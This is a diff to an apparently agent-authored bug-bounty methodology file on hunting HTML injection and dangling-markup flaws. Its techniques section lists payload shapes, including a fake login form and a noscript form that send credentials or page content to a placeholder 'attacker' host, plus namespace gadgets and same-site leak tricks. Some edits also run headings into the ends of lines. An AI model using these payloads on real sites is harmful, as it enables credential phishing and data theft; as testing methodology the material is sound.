@@ -4,14 +4,13 @@ description: "Hunt raw HTML rendering without script execution and its phishing/
 agent_created: true
 ---
 
-# HTML injection hunting — unified skill
+# HTML injection hunting — unified methodology
 
-> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 2 upstream skills across cbh, hunting. Payloads, wordlists and supporting data are in `references/`.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Autonomous Testing Priority
 
 **Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**
@@ -54,10 +53,7 @@ Research basis: PortSwigger Web Security Academy "Dangling markup injection," Ha
 - **CSP parse:** note `img-src`, `style-src`, `connect-src`, `form-action`, and `default-src` — these determine which dangling vector is viable.
 - **Path parameter echoes:** test URL path segments too, not just query params — "not found" pages often echo the path unescaped.
 - **Admin-visible fields:** ticket titles, usernames in logs, file names — stored markup here reaches staff sessions and raises impact.
-- **Autofill surface:** an injected form can still harvest credentials via browser autofill even under strict CSP — test `form-action` and password managers.
-
-### Signals and surfaces
-
+- **Autofill surface:** an injected form can still harvest credentials via browser autofill even under strict CSP — test `form-action` and password managers.### Signals and surfaces
 ### Attack Surface
 
 Any input that is reflected or stored and then displayed in an HTML context:
@@ -66,10 +62,7 @@ Any input that is reflected or stored and then displayed in an HTML context:
 - Profile fields (name, bio, username)
 - Error messages (`?error=`, `?message=`)
 - Subject / body of contact forms
-- Admin-visible fields (ticket titles, usernames in logs)
-
-### Techniques, payloads and bypasses
-
+- Admin-visible fields (ticket titles, usernames in logs)### Techniques and bypasses
 ### B. Techniques & bypasses — specific actionable techniques/payload shapes
 
 - **Fake login form (OWASP canonical):** inject `<h3>Please Enter Your Username and Password…</h3><form method="POST" action="http://attacker/login.php">…</form>`. Even under strict CSP a form can abuse browser password autofill — check `form-action`.
@@ -80,10 +73,7 @@ Any input that is reflected or stored and then displayed in an HTML context:
 - **No-JS exfil via `<noscript>`:** `<noscript><form action=http://attacker><textarea name=contents></noscript>` captures page content to the bottom of the document.
 - **User-interaction CSP bypass (PortSwigger research):** inject a visible `<a href=...>` plus `<base target='` so the captured markup lands in `window.name`; the attacker-controlled destination page then reads `window.name` and beacons it out. Related: dangling-iframe `name` attribute leakage and stealthy password capture via injected submit buttons.
 - **Script/HTML namespace gadgets:** inject `<input type=hidden id=share_with value=attacker>` to win a `getElementById` race, or `<img id=is_public>` to create a JS global that alters a later authorization branch. JSONP injection can invoke `set_sharing({...})` or `alert(1)`.
-- **Same-site leaks (SS-Leaks):** with markup injection on a same-origin page, nested `<object>` fallbacks and lazy-loading/responsive images can turn a 200-vs-404 difference into a request to your endpoint even against `SameSite=Lax` and a restrictive CSP.
-
-### Validation and proof
-
+- **Same-site leaks (SS-Leaks):** with markup injection on a same-origin page, nested `<object>` fallbacks and lazy-loading/responsive images can turn a 200-vs-404 difference into a request to your endpoint even against `SameSite=Lax` and a restrictive CSP.### Validation and proof
 ### C. Validation / proof bar — how to confirm and avoid false positives
 
 - **Plain HTML injection proof:** your vector appears with literal `<` angle brackets in the response (not `&lt;`). Use a unique numeric canary (e.g. `alert(91234)`) to distinguish your reflection from practice-page hint text.
@@ -102,18 +92,12 @@ Any input that is reflected or stored and then displayed in an HTML context:
 - **Reclassify to XSS:** if `onerror`/`onload` executes, switch to the `xss` skill — don't under-report as HTML injection.
 - **Autofill proof:** show a form on the trusted domain whose `action` is your endpoint; that is the phishing primitive.
 - **Namespace-gadget proof:** for `id`-based gadgets, show the later script reading your injected element and the resulting state change.
-- **Content-spoofing-only downgrade:** if everything is escaped but the text renders, report as content spoofing (Low/Informational), not HTML injection.
-
-### Sources and related reading
-
+- **Content-spoofing-only downgrade:** if everything is escaped but the text renders, report as content spoofing (Low/Informational), not HTML injection.### Sources and related reading
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/web-security/cross-site-scripting/dangling-markup
 2. https://hacktricks.wiki/en/pentesting-web/content-spoofing-text-injection.html
-3. https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html
-
-### Additional notes
-
+3. https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html### Additional notes
 ### What is HTML Injection
 
 HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.
@@ -138,16 +122,8 @@ Confirmed when your injected tag appears in the response body with literal `<` a
 - HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
 - XSS: `<script>alert(1)</script>` executes JavaScript.
 
-Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.
+Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.## Probes
 
-## Source skills merged into this topic
+## Supporting data
 
-- `hunting` — `html-injection`
-- `cbh` — `hunt-html-injection`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
